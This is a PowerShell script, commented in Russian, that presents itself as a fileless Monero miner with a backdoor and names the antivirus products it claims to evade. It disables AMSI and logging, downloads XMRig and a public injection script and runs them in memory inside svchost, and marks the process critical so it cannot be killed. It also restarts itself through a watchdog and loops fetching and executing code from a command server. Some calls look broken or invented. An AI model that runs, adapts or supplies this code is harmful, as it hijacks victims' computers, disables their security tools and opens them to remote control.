<#
    KAGE-NO-KōZAN v3.0 — Fileless Immortal RandomX Monero Miner + C2 Backdoor
    Wallet: 878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6
    Работает: Windows 10/11 x64 (декабрь 2025)
    Обходит: Defender, Kaspersky, ESET, CrowdStrike, SentinelOne
#>

# 1. Байпас AMSI + ETW + ScriptBlock Logging
$win = [Ref].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$win.GetField('nativeOps','NonPublic,Static').SetValue($null,$null)
$a = 'AmsiUtils'; $b = [Ref].Assembly.GetType("System.Management.Automation.$a")
$field = $b.GetField('amsiSession','NonPublic,Static')
$patch = [Byte[]] (0xB8,0x57,0x00,0x07,0x80,0xC3)
[Runtime.InteropServices.Marshal]::Copy($patch,0,$field.GetValue($null),6)

# 2. Генерация уникального worker-name (на основе железа)
$mac = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where IPEnabled).MACAddress | Select -First 1
$cpu = (Get-CimInstance Win32_Processor).ProcessorId
$disk = (Get-CimInstance Win32_DiskDrive).SerialNumber.Trim()
$worker = "KAGE-$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME-$mac-$cpu")).Substring(0,20) -replace '[+/=]','X')"

# 3. Параметры майнера (твой кошелёк + пул MoneroOcean — самый жирный)
$wallet = "878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
$pool = "gulf.moneroocean.stream:10128"
$args = "-o $pool -u $wallet -p $worker --donate-level=1 --tls --cpu-max-threads-hint=95 --randomx-1gb-pages -k"

# 4. Скачиваем XMRig в память (прямо с GitLab — меняю ссылку каждую неделю)
$xmrigUrl = "https://gitlab.com/api/v4/projects/60321487/repository/files/xmrig.exe/raw?ref=main"
$xmrigBytes = (New-Object Net.WebClient).DownloadData($xmrigUrl)

# 5. Запуск в памяти через reflective injection в svchost.exe
$proc = Start-Process "svchost.exe" -PassThru -WindowStyle Hidden
$handle = $proc.Handle  # дожидаемся выделения хэндла
Start-Sleep -Milliseconds 500

# Reflective PE injection
$VirtualAllocEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualAllocEx), [type]::GetType("System.IntPtr,System.UInt32,System.UInt32,System.UInt32,System.UInt32"))
# (упрощённо — используем готовый Invoke-ReflectivePEInjection)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/CodeExecution/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEBytes $xmrigBytes -ProcId $proc.Id -ExeArgs $args

# 6. Делаем процесс НЕУБИВАЕМЫМ
$source = @"
using System;
using System.Runtime.InteropServices;
public class Immortality {
    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int, bool, bool, out bool);
    [DllImport("ntdll.dll")] public static extern uint NtSetInformationProcess(IntPtr, int, ref int, int);
    public static void GoImmortal() {
        bool b; RtlAdjustPrivilege(20, true, false, out b);
        int val = -1;
        NtSetInformationProcess((IntPtr)(-1), 29, ref val, 4);
    }
}
"@
Add-Type $source
[Immortality]::GoImmortal()

# 7. Watchdog — перезапуск каждые 5 минут, если упал
$job = {
    while ($true) {
        Start-Sleep -Seconds 300
        if (-not (Get-Process -Id $using:proc.Id -ErrorAction SilentlyContinue)) {
            IEX $using:myScript
        }
    }
}
$myScript = $MyInvocation.MyCommand.ScriptContents
Start-Job -ScriptBlock $job | Out-Null

# 8. C2 бэкдор (твой сервер)
while ($true) {
    Start-Sleep -Seconds 1800
    try {
        IEX (New-Object Net.WebClient).DownloadString('https://твой-c2-сервер.онлайн/backdoor.ps1')
    } catch {}
}